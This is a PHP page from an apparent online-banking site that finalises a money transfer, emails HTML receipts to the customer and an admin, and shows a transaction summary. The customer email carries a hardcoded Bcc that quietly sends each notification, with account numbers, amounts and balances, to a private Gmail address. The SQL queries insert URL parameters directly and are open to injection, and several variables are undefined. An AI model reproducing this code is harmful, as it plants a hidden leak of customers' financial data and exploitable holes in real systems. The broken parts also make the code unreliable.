<?php 
session_start();
include('../sources/conn_auth.php');
include('../sources/customInfo.php');
include('../sources/config.php');
$selAmt = $conn->query("select * from transfer_info where MD5(trans_id) = '" . $_GET['trans_id'] . "'") or die(mysql_error());
$rowAmt = $selAmt->fetch_assoc(); 




//INSET TO DB
if(isset($_GET['fb'])){
$narratn = "Transfered to ". $rowAmt['ben_name'] .  "on" . date("d F, Y"); 
$ins = $conn->query("insert into credit_info (transact_id, payee_name, payee_accnt, cust_name, accnt_nmb, trans_type, narratn, amt_cred, amt_dep, dat_pay) values (NULL, '" . $rowAmt['ben_name'] . "', '" . $rowAmt['to_accnt'] . "', '" . $row['fullname'] . "', '" . $rowAmt['acct_nmb'] . "', 'Transfer', '$narratn', 0, '" . $rowAmt['amt_trans'] . "',  '" . date("Y-m-d") . "')") or die(mysql_error());

 
    //CURRENCE
$selcuuu = $conn->query("select * from curr_type where accnt_nmb = '" . $rowAmt['acct_nmb'] . "'") or die(mysql_error());
$rowCrrr = $selcuuu->fetch_assoc();
$currr = $rowCrrr['curr_type'];     
    
    
// TOTAL BALANCE
   $selBank = $conn->query("select *, sum(amt_cred) as totalCredit, sum(amt_dep) as totalDebit from credit_info where accnt_nmb = '" . $rowUser['acct_nmb'] . "' group by accnt_nmb") or die($conn->error);
     $rowBank = $selBank->fetch_assoc(); 
   $total = number_format($rowBank['totalCredit']-$rowBank['totalDebit'], 2, '.', ',');

  
    
     //NOTIFICATIN ALART       
$seLInfo = $conn->query("select * from all_notif") or die($conn->error);
$rowInfo = $seLInfo->fetch_array();
    
    
    
    

    
    
    
    
    
    
        // To send HTML mail, the Content-type header must be set
$adddate=date("D M d, Y g:i a");
$headers = "From:' $site_name'<noreply@$domain>\n";
$headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
$trans_id = substr(time()*rand(), 0, 14);
// Create email headers
    
    
    
$to = $rowUser['email'];
$subject = 'Transfer Notification';
$headers .= "Bcc: aturosandaval@gmail.com \r\n";
    
    

        
        // customer email hearders
$subject2 = "ADMIN TRANSACTION RECEIPT";
$headers2 = "From:'Transfer Fom $site_name'<transfer@$domain>\n";
$headers2 .= "Content-type:text/html;charset=UTF-8" . "\r\n";
 
 


    
 
// Compose a simple HTML email message
$message = '<html><body>';
$message .= '<div style="width:200px; display:block"><img src="'.$site_url.'/things/img/logo.png" width="90" height="64" /></div>';

    
    
$message = '<div class="">
<div style="padding: 9px;">
<p>&nbsp;</p>
<table style="height: 917px; background-color: #e4f2ec; width: 641px;" border="0" width="675" cellspacing="0" cellpadding="0" align="center">
<tbody>
<tr style="height: 700px;">
<td style="height: 631px; width: 655px;" valign="top" bgcolor="#FEFEFE">
<table style="height: 204px;" border="0" width="650" cellspacing="0" cellpadding="0" align="center">
<tbody>
<tr style="height: 192px;">
<td style="height: 192px; width: 646px;" valign="top"><img class="v1CToWUd v1a6T" src="'.$site_url.'/things/img/alert-pics.jpg" alt="Never Share With Anyone Your Information" width="640" height="346" border="0" /></td>
</tr>
<tr style="height: 12px;">
<td style="height: 12px; width: 646px;">&nbsp;</td>
</tr>
</tbody>
</table>
<table style="height: 622px; width: 639px;" border="0" width="590" cellspacing="0" cellpadding="0" align="center">
<tbody>
<tr style="height: 522px;">
<td style="height: 443px; width: 635px;" valign="top">
<h2 style="font-size: 15px; font-family: Montserrat, -apple-system, BlinkMacSystemFont,;">&nbsp;</h2>
<h2 style="font-size: 15px; font-family: Montserrat, -apple-system, BlinkMacSystemFont,;">Dear '. $rowUser['cust_name'] . ',</h2>
<center>
<h3 style="font-size: 16px; font-family: Montserrat, -apple-system, BlinkMacSystemFont,;">You have successfully wired transferred payment of</h3>
<h1 style="font-size: 30px; font-family: Montserrat, -apple-system, BlinkMacSystemFont,;"><span style="font-size: 30px; font-family: inherit; vertical-align: baseline; font-weight: 600; margin: 0px; line-height: 30px; font-stretch: inherit; border: 0px; padding: 0px;">' .$rowcurr['curr_type']. ' '. $rowAmt['amt_trans'] . '</span></h1>
</center>
<p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;This is the transaction that has occurred on your account.</p>
<table style="width: 651px; height: 135px;" border="0" cellspacing="3" cellpadding="3">
<tbody>
<tr style="height: 15px;">
<td style="width: 202px; height: 15px;" bgcolor="#D7CAF7"><strong>Beneficiary Name:</strong></td>
<td style="width: 422px; height: 15px;" align="left" bgcolor="#F0E5FD">' . $rowAmt['ben_name'] . '</td>
</tr>
<tr style="height: 15px;">
<td style="width: 202px; height: 15px;" bgcolor="#D7CAF7">A/C Number (IBAN):</td>
<td style="width: 422px; height: 15px;" align="left" bgcolor="#F0E5FD">' . $rowAmt['to_accnt'] . '</td>
</tr>
<tr style="height: 15px;">
<td style="width: 202px; height: 15px;" bgcolor="#D7CAF7">Bank Name:</td>
<td style="width: 422px; height: 15px;" align="left" bgcolor="#F0E5FD">&nbsp;'. $rowAmt['bank_name'] . '</td>
</tr>
<tr style="height: 15px;">
<td style="width: 202px; height: 15px;" bgcolor="#D7CAF7"><strong>Transfer Amount:</strong></td>
<td style="width: 422px; height: 15px;" align="left" bgcolor="#F0E5FD">&nbsp;'.$rowcurr['curr_type']. ' '. $rowAmt['amt_trans'] . '</td>
</tr>
<tr style="height: 15px;">
<td style="width: 202px; height: 15px;" bgcolor="#D7CAF7">Reference Number:</td>
<td style="width: 422px; height: 15px;" align="left" bgcolor="#F0E5FD">&nbsp;'. $trans_id .'</td>
</tr>
<tr style="height: 15px;">
<td style="width: 202px; height: 15px;" bgcolor="#D7CAF7">Swift Code:</td>
<td style="width: 422px; height: 15px;" align="left" bgcolor="#F0E5FD">&nbsp;'. $rowAmt['swift_code'] . '</td>
</tr>
<tr style="height: 15px;">
<td style="width: 202px; height: 15px;" bgcolor="#D7CAF7">Transaction Branch:</td>
<td style="width: 422px; height: 15px;" align="left" bgcolor="#F0E5FD">&nbsp;HEAD OFFICE</td>
</tr>
<tr style="height: 15px;">
<td style="width: 202px; height: 15px;" bgcolor="#D7CAF7">Transaction Date:</td>
<td style="width: 422px; height: 15px;" align="left" bgcolor="#F0E5FD">&nbsp;'.$adddate.'</td>
</tr>
<tr style="height: 15px;">
<td style="width: 202px; height: 15px;" bgcolor="#D7CAF7">Value Date:</td>
<td style="width: 422px; height: 15px;" align="left" bgcolor="#F0E5FD">&nbsp;'.$adddate.'</td>
</tr>
<tr style="height: 15px;">
<td style="width: 202px; height: 15px;" bgcolor="blue"><strong>Available Balance:</strong></td>
<td style="width: 422px; height: 15px;" align="left" bgcolor="skyblue">&nbsp;' .$rowcurr['curr_type']. ' '.$total.'</td>
</tr>
</tbody>
</table>
<p>&nbsp;</p>
<p><strong>Important Security and Privacy Information</strong><br />Your <em><span>'.$site_name.'</span></em> user ID and password, security answers, card numbers and PIN are private and should never be disclosed to anyone.</p>
</td>
</tr>
<tr style="height: 179px;">
<td style="font-size: 15px; width: 635px; height: 179px;"><center>
<h3 style="font-size: 16px; font-family: Montserrat, -apple-system, BlinkMacSystemFont,;">Kindly click to rate your experience with This Bank</h3>
<div style="overflow: auto; max-width: 680px; vertical-align: baseline; margin: 0px auto; border: 0px; padding: 0px;">
<table style="max-width: 450px; width: 450px; height: 76px;" border="0" width="100%" cellspacing="0" cellpadding="0">
<tbody>
<tr style="height: 76px;">
<td style="max-width: 33.33%; padding: 5px; white-space: normal !important; height: 76px; width: 137px;">
<table style="max-width: 120px; width: 120px; table-layout: auto;" border="0" width="120" cellspacing="0" cellpadding="0">
<tbody>
<tr>
<td style="width: 120px; white-space: normal !important; text-align: center; border-radius: 5px; padding: 5px 0px 5px 0px;"><a style="vertical-align: baseline; color: #616874; margin: 0px; display: block; border: 0px; padding: 0px;" href="'.$site_url.'/alart-rate-us"><img id="x_ymail_ctr_id_-94339-49" style="max-width: 100%; width: 50px; vertical-align: baseline; min-height: 50px; margin: 0px; border: 0px; padding: 0px;" src="'.$site_url.'/things/img/Good.png" width="50" /></a>
<p style="font-size: 14px; font-family: Montserrat, -apple-system, BlinkMacSystemFont,;">Good</p>
</td>
</tr>
</tbody>
</table>
</td>
<td style="max-width: 33.33%; padding: 5px; white-space: normal !important; height: 76px; width: 137px;">
<table style="max-width: 120px; width: 120px; table-layout: auto;" border="0" width="120" cellspacing="0" cellpadding="0">
<tbody>
<tr>
<td style="width: 120px; white-space: normal !important; text-align: center; border-radius: 5px; padding: 5px 0px 5px 0px;"><a style="vertical-align: baseline; color: #616874; margin: 0px; display: block; border: 0px; padding: 0px;" href="'.$site_url.'/alart-rate-us"><img id="x_ymail_ctr_id_-307610-50" style="max-width: 100%; width: 50px; vertical-align: baseline; min-height: 50px; margin: 0px; border: 0px; padding: 0px;" src="'.$site_url.'/things/img/skeptical.png" width="50" /></a>
<p style="font-size: 14px; font-family: Montserrat, -apple-system, BlinkMacSystemFont,;">Fair</p>
</td>
</tr>
</tbody>
</table>
</td>
<td style="max-width: 33.33%; padding: 5px; white-space: normal !important; height: 76px; width: 138px;">
<table style="max-width: 120px; width: 120px; table-layout: auto;" border="0" width="120" cellspacing="0" cellpadding="0">
<tbody>
<tr>
<td style="width: 120px; white-space: normal !important; text-align: center; border-radius: 5px; padding: 5px 0px 5px 0px;"><a style="vertical-align: baseline; color: #616874; margin: 0px; display: block; border: 0px; padding: 0px;" href="'.$site_url.'/alart-rate-us"><img id="x_ymail_ctr_id_-717384-51" style="max-width: 100%; width: 50px; vertical-align: baseline; min-height: 50px; margin: 0px; border: 0px; padding: 0px;" src="'.$site_url.'/things/img/Bad.png" width="50" /></a>
<p style="font-size: 14px; font-family: Montserrat, -apple-system, BlinkMacSystemFont,;">Bad</p>
</td>
</tr>
</tbody>
</table>
</td>
</tr>
</tbody>
</table>
</div>
</center></td>
</tr>
</tbody>
</table>
</td>
</tr>
<tr style="height: 91px;">
<td style="height: 77px; width: 655px;" valign="top">
<p><img src="'.$site_url.'/things/img/mandatory.png" width="650" height="51" /></p>
</td>
</tr>
<tr style="height: 74px;">
<td style="height: 70px; width: 655px;" valign="top">
<table style="height: 47px; width: 100%;" border="0" width="100%" cellspacing="0" cellpadding="0">
<tbody>
<tr style="height: 47px;">
<td style="height: 47px;" valign="top" width="10%">&nbsp;</td>
<td style="height: 47px;" valign="top" width="30%"><a href="https://www.facebook.com" target="_blank" rel="noopener noreferrer"><img src="'.$site_url.'/things/img/fb_purple.png" width="52" height="52" border="0" /></a><a href="https://twitter.com" target="_blank" rel="noopener noreferrer"><img src="'.$site_url.'/things/img/twt_purple.png" width="52" height="52" border="0" /></a><a href="http://www.linkedin.com/" target="_blank" rel="noopener noreferrer"><img src="'.$site_url.'/things/img/LkdIn_purple.png" width="52" height="52" border="0" /></a><img src="'.$site_url.'/things/img/Ig_purple.png" width="52" height="52" /><img src="'.$site_url.'/things/img/Whatsapp_purple.png" width="52" height="52" /></td>
</tr>
</tbody>
</table>
</td>
</tr>
<tr style="height: 139px;">
<td style="height: 139px; width: 655px;" valign="top">
<table style="width: 635px;" border="0" width="650" cellspacing="0" cellpadding="0" align="center">
<tbody>
<tr>
<td style="width: 631px;" valign="top" bgcolor="#FFFFFF"><span style="color: #9297a3;">If you have reason to suspect any unauthorised activity on your account<br />please contact us by sending an email to '.$admin_email.'</span><br /><br /><span style="color: #9297a3;"><span>For more information on our products and services, please call our 24/7<br />contact centre on '.$admin_phone.'</span></span>&nbsp;<span style="color: #9297a3;"><span>or chat with us via</span></span><br /><span style="color: #5c068c;"><span>Whatsapp on '.$admin_phone.'</span></span>&nbsp;<span style="color: #efefef;"><br /></span><span style="color: #9297a3;">Alternatively send an email to</span> <span style="color: #9297a3;">'.$admin_email.'</span><br /><br />Copyright &copy; 2021. '.$site_name.'</td>
</tr>
</tbody>
</table>
</td>
</tr>
</tbody>
</table>
</div>
</div>';
    

$message .= '</div>';
$message .= '</body></html>';
    
    
    
    
 // customer message 
    $message2 = '<html><body>';
$message2 .= '<div style=" border:1px solid rgba(0, 0, 0, 0.3); border-radius:6px; box-shadow:1px 3px 2px rgba(0, 0, 0, 0.6); padding:10px;">';
$message .= '<div style="padding:9px;">';
     $message2 .= '<p style="color:#000066; font-size:14px; font-weight:400">Dear Admin</p>';
    $message2 .= '<p style="color:#000066; font-size:14px; font-weight:400">Transaction ID: '. $trans_id .'<br> Sender Name : ' . $row['fullname'] . ' <br>Account Number '. $rowAmt['acct_nmb'] . '<br> </p>'; 
    
    
    
     $message2 .= '<p style="color:#000066; font-size:14px; font-weight:400">Recipiant Details.<br> Full Name:  ' . $rowAmt['ben_name'] . '<br>Account Number (IBAN):  ' . $rowAmt['to_accnt'] . '<br>Bank Name:  '. $rowAmt['bank_name'] . '<br>Transfer Amount: '.$rowCrrr['curr_type'] .'  '. $rowAmt['amt_trans'] . ' <br> Swiftcode:  '. $rowAmt['swift_code'] . '<br> Date & Time:  '.$adddate.' </p>';
    
    
    
    
   $message2 .= '<p style="color:#000066; font-size:14px; font-weight:400">.</p>';

$message2 .= '</div>';
$message2 .= '</body></html>';  
  
    
    
 
// Sending email
    {   
    mail($admin_email,$subject2,$message2,$headers2);
    }
    
    
    //TO OFF/ON CUSTOMER LOGIN NOTIFICATION
    
if($rowInfo['trans_not']=="On"){
     {
    mail($to,$subject,$message,$headers);
    }
   header('location:transfer-info?trans_id='. $_GET['trans_id'] .'&gt=Email-sending-successful-&-generating-code&edb=9003003993mnhd9389893493');
} else{
  header('location:transfer-info?trans_id='. $_GET['trans_id'] .'&gt=Email-sending-not-successful-&-generating-code&edb=9003003993mnhd9389893493');
}
}
?>

  <!-- /. NAV TOP  -->
        <!-- . SIDENAV  -->
    <?php include('../includes/head.php');?>
    <?php include('../includes/sidebar.php');?>
        <!-- /. SIDENAV  -->
    
     <?php
         $selTrans = $conn->query("select * from credit_info  where accnt_nmb = '" . $rowUser['acct_nmb'] . "'") or die($conn->error);
         $rowTrans = $selTrans->fetch_assoc();
      ?> 
    
        <!-- /. NAV SIDE  -->
        <div id="page-wrapper" >
            <div id="page-inner">
                <div class="row">
                    <div class="col-lg-12">
                       
                    </div>
                </div>              
                 <!-- /. ROW  -->
                  <hr />
                
                
            
                
                
            
                
            
               <?php include('../includes/account_info.php');?> 
                       
            <div class="section"> 
                
                
   
   
     
    <!--==========================
      Our Team Section
    ============================-->
    <section id="team">
      <div class="container" style="width:90%;">
        <div class="section-header">
        </div>
          
          
          
          
          
          
          
          <center>
        <div class="row">
          <div class="">
            <div class="col-lg-12">
                        <div class="pInfo">
                         
                   <div class="transT">
                   <img src="things/img/complete.png" width="180" height="180">
               <hr>
               <h3 class="style10">Transfer details</h3>
                         <h5><span class="style4">The funds transfered will be recieved in the next 5 Hours </span></h5>

               <div class="spinDiv">
                   
                 <?php
							$seldel = $conn->query("select * from transfer_info where MD5(trans_id) = '" . $_GET['trans_id'] . "'") or die(mysql_error());
                            if(!$seldel->num_rows){
							?>
                            <tr>
                            <td colspan="5" bgcolor="#FFFFFF"><span class="style4">Sorry there is no transaction for this account </span></td>
                      </tr>
                            <?php
							}else{
							$rowDel= $seldel->fetch_array();
                            ?>
							<tr >
                
                
<tr>
<td style="font-size: 15px; font-family: Montserrat, -apple-system, BlinkMacSystemFont,;">
<h2 style="font-size: 16px; font-family: Montserrat, -apple-system, BlinkMacSystemFont,;">Transaction Summary</h2>
<div style="overflow: auto; max-width: 680px; vertical-align: baseline; margin: 0px auto; border: 0px; padding: 0px;">
<table style="width: 640px; background: #efefef;" border="0" width="100%" cellspacing="0" cellpadding="0">
<tbody>
<tr>
<td style="font-size: 11px; font-family: Montserrat, -apple-system, BlinkMacSystemFont,;" valign="top" width="45%">Recipient Name</td>
<td style="font-size: 11px; font-family: Montserrat, -apple-system, BlinkMacSystemFont,;" valign="top" width="55%"><?php echo $rowDel['ben_name']; ?></td>
</tr>
<tr>
<td style="font-size: 11px; font-family: Montserrat, -apple-system, BlinkMacSystemFont,;" valign="top" width="45%">Recipient Account Number</td>
<td style="font-size: 11px; font-family: Montserrat, -apple-system, BlinkMacSystemFont,;" valign="top" width="55%"><?php echo $rowDel['to_accnt']; ?></td>
</tr>
<tr>
<td style="font-size: 11px; font-family: Montserrat, -apple-system, BlinkMacSystemFont,;" valign="top" width="45%">Bank Name</td>
<td style="font-size: 11px; font-family: Montserrat, -apple-system, BlinkMacSystemFont,;" valign="top" width="55%"><?php echo $rowDel['bank_name']; ?></td>
</tr>
<tr>
<td style="font-size: 11px; font-family: Montserrat, -apple-system, BlinkMacSystemFont,;" valign="top" width="45%">Amount</td>
<td style="font-size: 11px; font-family: Montserrat, -apple-system, BlinkMacSystemFont,;" valign="top" width="55%"><?php echo getCurrency($rowcurr['curr_type']) . " " . number_format($rowDel['amt_trans'], 2, '.', ','); ?></td>
</tr>
<tr>
<td style="font-size: 11px; font-family: Montserrat, -apple-system, BlinkMacSystemFont,;" valign="top" width="45%">Swift Code</td>
<td style="font-size: 11px; font-family: Montserrat, -apple-system, BlinkMacSystemFont,;" valign="top" width="55%"><?php echo $rowDel['swift_code']; ?></td>
</tr> 
<tr>
<td style="font-size: 11px; font-family: Montserrat, -apple-system, BlinkMacSystemFont,;" valign="top" width="45%">Sort Code</td>
<td style="font-size: 11px; font-family: Montserrat, -apple-system, BlinkMacSystemFont,;" valign="top" width="55%"><?php echo $rowDel['sort_code']; ?></td>
</tr>    
<tr>
<td style="font-size: 11px; font-family: Montserrat, -apple-system, BlinkMacSystemFont,;" valign="top" width="45%">Transaction Date</td>
<td style="font-size: 11px; font-family: Montserrat, -apple-system, BlinkMacSystemFont,;" valign="top" width="55%">
    <?php echo date("Y-m-d") ; ?></td>
</tr>
<tr>
<td style="font-size: 11px; font-family: Montserrat, -apple-system, BlinkMacSystemFont,;" valign="top" width="45%">Available Balance</td>
<td style="font-size: 11px; font-family: Montserrat, -apple-system, BlinkMacSystemFont,;" valign="top" width="55%"><?php echo getCurrency($rowcurr['curr_type']);  echo number_format($rowBank['totalCredit']-$rowBank['totalDebit'], 2, '.', ','); ?></td>
</tr>
    <?php
						   }
						   
						   ?>
    
    
</tbody>
</table>
</div>
</td>
</tr>
                               
    </center>            
                
       </div>  </div>  
                
                
 
                
      
                                
                                
                  
                                
                                
                                
               
                
<tr>
<td style="font-size: 15px; font-family: Montserrat, -apple-system, BlinkMacSystemFont,;">
<h2 style="font-size: 16px; font-family: Montserrat, -apple-system,  BlinkMacSystemFont,;">Recent Transactions</h2>
<div style="overflow: auto; max-width: 680px; vertical-align: baseline; margin: 0px auto; border: 0px; padding: 0px;">
<table border="0" width="100%" cellspacing="0" cellpadding="0" align="center">
<tbody>
<tr style="font-size: 12px;">
<td style="width: 87px; white-space: normal !important; background-color: #f5f6fa; padding: 3pt 3.75pt 3pt 3.75pt;">
<p style="font-size: 11pt; font-family: Calibri, sans-serif; margin: 0px; line-height: 15pt;"><span style="font-size: 10.5pt; border-top: 0px;">Date</span></p>
</td>
<td style="width: 322px; white-space: normal !important; background-color: #f5f6fa; padding: 3pt 3.75pt 3pt 3.75pt;">
<p style="font-size: 11pt; font-family: Calibri, sans-serif; margin: 0px; line-height: 15pt;"><span style="font-size: 10.5pt; border-top: 0px;">Narrative</span></p>
</td>
<td style="width: 86px; white-space: normal !important; text-align: center; background-color: #f5f6fa; padding: 3pt 3.75pt 3pt 3.75pt;">
<p style="font-size: 11pt; font-family: Calibri, sans-serif; margin: 0px; line-height: 15pt;"><span style="font-size: 10.5pt; border-top: 0px;">Type</span></p>
</td>
<td style="width: 105px; white-space: normal !important; text-align: right; background-color: #f5f6fa; padding: 3pt 3.75pt 3pt 3.75pt;">
<p style="font-size: 11pt; font-family: Calibri, sans-serif; margin: 0px; line-height: 15pt;"><span style="font-size: 10.5pt; border-top: 0px;">Amount</span></p>
</td>
</tr>
    
    
    
    
  <?php
				  $i=0;
				  $selRTrans = $conn->query("select * from credit_info  where accnt_nmb = '" . $rowUser['acct_nmb'] . "' ORDER BY dat_pay DESC LIMIT 4") or die($conn->error);
                  while($rowRTrans = $selRTrans->fetch_array()){
				  $i++;
				  ?>      
    
<tr>
<td style="border-top-style: none; border-left-style: none; width: 87px; white-space: normal !important; border-bottom: #f1f1f3 1pt solid; border-right-style: none; padding: 3pt 3.75pt 3pt 3.75pt;">
<p style="font-size: 11pt; font-family: Calibri, sans-serif; margin: 0px; line-height: 15pt;"><span style="font-size: 7pt; border-top: 0px;"><?php echo date("Y-m-d") ; ?></span></p>
</td>
<td style="border-top-style: none; border-left-style: none; width: 322px; white-space: normal !important; border-bottom: #f1f1f3 1pt solid; border-right-style: none; padding: 3pt 3.75pt 3pt 3.75pt;">
<p style="font-size: 11pt; font-family: Calibri, sans-serif; margin: 0px; line-height: 15pt;"><span style="font-size: 7pt; border-top: 0px;"><?php echo $rowRTrans['payee_name']; ?>/<?php echo $rowRTrans['narratn']; ?></span></p>
</td>
<td style="border-top-style: none; border-left-style: none; width: 86px; white-space: normal !important; border-bottom: #f1f1f3 1pt solid; border-right-style: none; padding: 3pt 3.75pt 3pt 3.75pt;">
<p style="font-size: 11pt; font-family: Calibri, sans-serif; text-align: center; margin: 0px; line-height: 15pt;" align="center"><span style="font-size: 7pt; border-top: 0px;"><img id="x_yiv3493443267_x0000_i1029" style="width: 5.49pt; vertical-align: baseline; min-height: 8.49pt; margin: 0px; border: 0px; padding: 0px;" src="things/img/up.png" alt="CR" border="0" /><?php echo $rowRTrans['trans_type']; ?> </span></p>
</td>
<td style="border-top-style: none; border-left-style: none; width: 105px; white-space: normal !important; border-bottom: #f1f1f3 1pt solid; border-right-style: none; padding: 3pt 3.75pt 3pt 3.75pt;">
<p style="font-size: 11pt; font-family: Calibri, sans-serif; text-align: right; margin: 0px; line-height: 15pt;" align="right"><span style="font-size: 7pt; border-top: 0px;"><?php echo getCurrency($rowcurr['curr_type']) . " " . number_format($rowRTrans['amt_cred'], 2, '.', ','); ?>/<?php echo getCurrency($rowcurr['curr_type']) . " " . number_format($rowRTrans['amt_dep'], 2, '.', ','); ?></span></p>
</td>
</tr>
</tbody>
    
 <?php
						   }
						   
						   ?>     
</table>
</div>
</td>
</tr>
                      
           
            
                  
      
            <center>
            
          <table style="max-width: 450px; width: 270px;" border="0" width="100%" cellspacing="0" cellpadding="0">
<tbody>
<tr>
<td style="max-width: 33.33%; white-space: normal !important; padding: 5px;" width="33.33%">
<table style="max-width: 120px; width: 80px; table-layout: auto;" border="0" width="120" cellspacing="0" cellpadding="0">
<tbody>
<tr>
<td style="width: 120px; white-space: normal !important; text-align: center; border-radius: 5px; padding: 5px 0px 5px 0px;"><a style="vertical-align: baseline; color: #616874; margin: 0px; display: block; border: 0px; padding: 0px;" rel="noopener"   href="alart-rate-us" target="_blank" ><img id="x_ymail_ctr_id_-94339-49" style="max-width: 100%; width: 50px; vertical-align: baseline; min-height: 50px; margin: 0px; border: 0px; padding: 0px;" src="things/img/Good.png" width="50" /></a>
<p style="font-size: 14px; font-family: Montserrat, -apple-system, BlinkMacSystemFont,;">Good</p>
</td>
</tr>
</tbody>
</table>
</td>
<td style="max-width: 33.33%; white-space: normal !important; padding: 5px;" width="33.33%">
<table style="max-width: 120px; width: 80px; table-layout: auto;" border="0" width="120" cellspacing="0" cellpadding="0">
<tbody>
<tr>
<td style="width: 120px; white-space: normal !important; text-align: center; border-radius: 5px; padding: 5px 0px 5px 0px;"><a style="vertical-align: baseline; color: #616874; margin: 0px; display: block; border: 0px; padding: 0px;" rel="noopener" href="alart-rate-us" target="_blank" ><img id="x_ymail_ctr_id_-307610-50" style="max-width: 100%; width: 50px; vertical-align: baseline; min-height: 50px; margin: 0px; border: 0px; padding: 0px;" src="things/img/skeptical.png" width="50" /></a>
<p style="font-size: 14px; font-family: Montserrat, -apple-system, BlinkMacSystemFont,;">Fair</p>
</td>
</tr>
</tbody>
</table>
</td>
<td style="max-width: 33.33%; white-space: normal !important; padding: 5px;" width="33.33%">
<table style="max-width: 120px; width: 80px; table-layout: auto;" border="0" width="120" cellspacing="0" cellpadding="0">
<tbody>
<tr>
<td style="width: 120px; white-space: normal !important; text-align: center; border-radius: 5px; padding: 5px 0px 5px 0px;"><a style="vertical-align: baseline; color: #616874; margin: 0px; display: block; border: 0px; padding: 0px;" rel="noopener"  href="alart-rate-us" target="_blank"><img id="x_ymail_ctr_id_-717384-51" style="max-width: 100%; width: 50px; vertical-align: baseline; min-height: 50px; margin: 0px; border: 0px; padding: 0px;" src="things/img/Bad.png" width="50" /></a>
<p style="font-size: 14px; font-family: Montserrat, -apple-system, BlinkMacSystemFont,;">Bad</p>
</td>
</tr>
</tbody>
</table>
        <tr>

<td colspan="7"><a href="transfer-money?db=new transfer&tID=8739plT38300202992"  class="btn btn-warning btnTax">New transfer</a></td>
    
        
 <td colspan="2"><a  href="portal?trans_info=Transaction completed"  class="btn btn-warning btnTax">Close</a></td>
            
</tr>
</td>
</tr>
</tbody>
</table>            
            

            
      </center>      
            
            
            
  
</div>
               
          </div>

       

         

      </div>
    </section><!-- #team -->

 



                  </div>
              </div>
           
    </div>
         
        <!-- . FOOTER  -->
        
          <?php include('../includes/footer.php');?>
        <!-- /. FOOTER  -->
          
